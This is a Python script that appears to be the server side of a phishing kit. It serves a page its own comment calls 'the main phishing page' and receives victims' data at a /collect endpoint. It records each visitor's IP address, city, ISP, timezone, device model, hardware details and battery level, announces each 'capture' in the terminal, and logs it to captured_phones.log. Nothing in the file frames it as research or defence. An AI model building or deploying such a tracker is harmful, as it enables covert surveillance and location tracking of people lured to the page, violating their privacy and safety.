#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import socket
from datetime import datetime
import os

class PhoneTrackerHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            # Serve the main phishing page
            self.serve_file('phone_tracker.html')
        elif self.path == '/phone_tracker.html':
            # Serve the HTML file directly
            self.serve_file('phone_tracker.html')
        else:
            self.send_error(404)
    
    def do_POST(self):
        if self.path == '/collect':
            # Handle data collection from phone
            try:
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length)
                phone_data = json.loads(post_data.decode())
                
                # Process and display the data
                self.display_phone_data(phone_data)
                
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({'status': 'success'}).encode())
                
            except Exception as e:
                print(f"❌ Error processing request: {e}")
                self.send_response(500)
                self.end_headers()
        else:
            self.send_error(404)
    
    def serve_file(self, filename):
        """Serve static files"""
        try:
            with open(filename, 'rb') as f:
                content = f.read()
            
            self.send_response(200)
            
            if filename.endswith('.html'):
                self.send_header('Content-type', 'text/html; charset=utf-8')
            else:
                self.send_header('Content-type', 'application/octet-stream')
                
            self.end_headers()
            self.wfile.write(content)
            
        except FileNotFoundError:
            self.send_error(404, f"File not found: {filename}")
        except Exception as e:
            self.send_error(500, f"Server error: {str(e)}")
    
    def detect_phone_model(self, user_agent):
        """Detect specific phone model from User Agent"""
        if not user_agent:
            return "Unknown Device"
            
        ua = user_agent.lower()
        
        # Infinix Detection
        if 'infinix' in ua:
            if 'smart 8' in ua or 'x6827' in ua:
                return "Infinix Smart 8"
            elif 'hot 60' in ua or 'x6833' in ua:
                return "Infinix Hot 60 Pro"
            elif 'x68' in ua:
                return "Infinix Hot Series"
            else:
                return "Infinix Device"
        
        # Other brands
        brands = {
            'samsung': 'Samsung', 'xiaomi': 'Xiaomi', 'redmi': 'Redmi',
            'oppo': 'OPPO', 'vivo': 'Vivo', 'realme': 'Realme',
            'iphone': 'iPhone', 'ipad': 'iPad', 'huawei': 'Huawei',
            'oneplus': 'OnePlus', 'nokia': 'Nokia', 'sony': 'Sony'
        }
        
        for brand, name in brands.items():
            if brand in ua:
                return f"{name} Device"
                
        return "Unknown Mobile Device"
    
    def display_phone_data(self, data):
        """Display phone data in terminal with nice formatting"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Detect device model
        user_agent = data.get('deviceInfo', {}).get('userAgent', '')
        device_model = self.detect_phone_model(user_agent)
        
        print("\n" + "🎯" * 25)
        print("📱 PHONE DATA CAPTURED SUCCESSFULLY!")
        print("🎯" * 25)
        
        print(f"🕐 Capture Time: {timestamp}")
        print(f"📱 Device Model: {device_model}")
        print(f"🌐 IP Address: {data.get('ip', 'Unknown')}")
        
        # Location info
        location = data.get('location', {})
        if location and 'error' not in location:
            print(f"📍 Location: {location.get('city', 'Unknown')}, {location.get('country', 'Unknown')}")
            print(f"📡 ISP: {location.get('isp', 'Unknown')}")
            print(f"🌍 Timezone: {location.get('timezone', 'Unknown')}")
        
        # Device details
        device_info = data.get('deviceInfo', {})
        print(f"⚙️ Platform: {device_info.get('platform', 'Unknown')}")
        print(f"🧠 RAM: {device_info.get('deviceMemory', 'Unknown')}GB")
        print(f"🔢 CPU Cores: {device_info.get('hardwareConcurrency', 'Unknown')}")
        print(f"👆 Touch Points: {device_info.get('maxTouchPoints', 'Unknown')}")
        
        # Screen info
        screen = data.get('screen', {})
        print(f"📺 Screen: {screen.get('width', 'Unknown')}x{screen.get('height', 'Unknown')}")
        
        # Browser info
        browser = data.get('browser', {})
        print(f"🌐 Browser: {browser.get('name', 'Unknown')}")
        print(f"🗣️ Language: {browser.get('language', 'Unknown')}")
        
        # Battery info
        battery = data.get('battery', {})
        if battery and 'level' in battery:
            print(f"🔋 Battery: {battery.get('level', 'Unknown')}")
        
        print("🎯" * 25)
        print("✅ Data also saved to: captured_phones.log")
        print("🎯" * 25)
        
        # Save to log file
        log_entry = {
            'timestamp': timestamp,
            'device_model': device_model,
            'data': data
        }
        
        try:
            with open('captured_phones.log', 'a', encoding='utf-8') as f:
                f.write(json.dumps(log_entry, ensure_ascii=False, indent=2) + ',\n')
        except Exception as e:
            print(f"⚠️ Could not save to log file: {e}")
    
    def log_message(self, format, *args):
        # Custom log format - don't show normal GET requests
        if self.path not in ['/', '/phone_tracker.html']:
            client_ip = self.client_address[0]
            print(f"🌐 [{datetime.now().strftime('%H:%M:%S')}] {client_ip} - {self.path}")

def get_local_ip():
    """Get local IP address for phone access"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "0.0.0.0"  # Bind to all interfaces

def main():
    local_ip = get_local_ip()
    port = 8080
    
    print("🚀 PHONE TRACKER SERVER - 100% WORKING")
    print("=" * 50)
    print(f"🌐 Server URL: http://{local_ip}:{port}")
    print(f"📱 Access from phone: http://{local_ip}:{port}/phone_tracker.html")
    print("⚡ When phone clicks button, data appears HERE in terminal!")
    print("=" * 50)
    print("✅ Server starting...")
    
    try:
        server = HTTPServer(('0.0.0.0', port), PhoneTrackerHandler)
        print(f"✅ Server running on port {port}")
        print("🛑 Press Ctrl+C to stop the server")
        print("")
        
        server.serve_forever()
        
    except Exception as e:
        print(f"❌ Server error: {e}")
        print("💡 Try using: python3 -m http.server 8080 --bind 0.0.0.0")

if __name__ == "__main__":
    main()
EOF
